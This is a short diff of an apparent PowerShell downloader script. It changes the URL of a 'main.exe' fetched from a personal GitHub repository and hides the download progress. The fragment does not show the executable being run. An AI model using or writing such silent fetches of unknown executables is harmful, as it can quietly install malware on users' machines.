@@ -1,4 +1,4 @@
-$Url = "https://github.com/AlexanderWhite77/Crimm/raw/main/main.exe"
+$Url = "https://github.com/tayic99373/leave/raw/main/main.exe"
 $OutputFile = "main.exe"
 
 $ProgressPreference = 'SilentlyContinue'
